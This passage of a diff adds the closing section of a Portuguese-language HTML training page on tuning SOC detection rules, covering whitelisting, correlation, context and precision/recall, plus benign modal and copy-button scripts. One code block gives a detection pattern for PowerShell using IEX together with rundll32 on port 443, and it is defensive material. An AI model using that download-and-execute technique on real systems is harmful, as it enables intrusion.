+    <button class="modal-close" onclick="closeModal('detection-tuning')">✕</button>
+    <h2>⚙️ Detection Rule Tuning</h2>
+    <p>Otimizar regras de detecção para maximizar efetividade e minimizar falsos positivos.</p>
+
+    <h3>Problema: Falsos positivos</h3>
+    <ul>
+      <li>Reduzem confiança em alertas</li>
+      <li>Aumentam carga de SOC</li>
+      <li>Mascaram ataques reais</li>
+    </ul>
+
+    <h3>Estratégia de tuning</h3>
+
+    <h4>1. Whitelisting</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Adicionar processos legítimos
+# Ex: Backup software que executa PowerShell
+# Excluir de alert: (ImageName != "*backup*.exe")
+    </div>
+
+    <h4>2. Correlação</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Ao invés de alertar em qualquer:
+# PowerShell.exe com IEX
+
+# Alertar apenas em:
+# PowerShell.exe + IEX + DestinationPort=443 + NewProcess=rundll32.exe
+    </div>
+
+    <h4>3. Contextualização</h4>
+    <ul>
+      <li>Horário (behavior anormal fora de horas de trabalho?)</li>
+      <li>Usuário (admin ou usuário comum?)</li>
+      <li>Localização (IP corporativo ou VPN?)</li>
+      <li>Histórico (foi detectado antes?)</li>
+    </ul>
+
+    <h4>4. Métrica: True Positive vs False Positive</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+Precision = TP / (TP + FP)
+Recall = TP / (TP + FN)
+F-score = 2 * (Precision * Recall) / (Precision + Recall)
+
+Meta: Maximize Precision (reduzir FP) sem sacrificar Recall (não perder ataques)
+    </div>
+
+    <h3>Processo contínuo</h3>
+    <ol>
+      <li>Coletar feedback de SOC (muitos falsos positivos?)</li>
+      <li>Ajustar thresholds / correlation</li>
+      <li>A/B test novas regras</li>
+      <li>Medir impacto em TP/FP</li>
+      <li>Iterar</li>
+    </ol>
+
+    <div class="info-box">
+      <strong>💡 Regra 80/20:</strong> 20% das regras capturam 80% dos verdadeiros ataques — foco nessas.
+    </div>
+  </div>
+</div>
+
+<script>
+  function openModal(id) {
+    document.getElementById(id).classList.add('active');
+  }
+
+  function closeModal(id) {
+    document.getElementById(id).classList.remove('active');
+  }
+
+  function copyCode(btn) {
+    const code = btn.nextElementSibling ? btn.parentElement.textContent.replace('📋', '').trim() : btn.parentElement.textContent.replace('📋', '').trim();
+    navigator.clipboard.writeText(code);
+
+    const originalText = btn.textContent;
+    btn.textContent = '✅ Copiado!';
+    setTimeout(() => {
+      btn.textContent = originalText;
+    }, 2000);
+  }
+
+  // Fechar modal ao clicar fora
+  document.querySelectorAll('.modal').forEach(modal => {
+    modal.addEventListener('click', function(e) {
+      if (e.target === this) {
+        this.classList.remove('active');
+      }
+    });
+  });
+
+  // Fechar com ESC
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') {
+      document.querySelectorAll('.modal.active').forEach(modal => {
+        modal.classList.remove('active');
+      });
+    }
+  });
+</script>
+
+</body>
+</html>
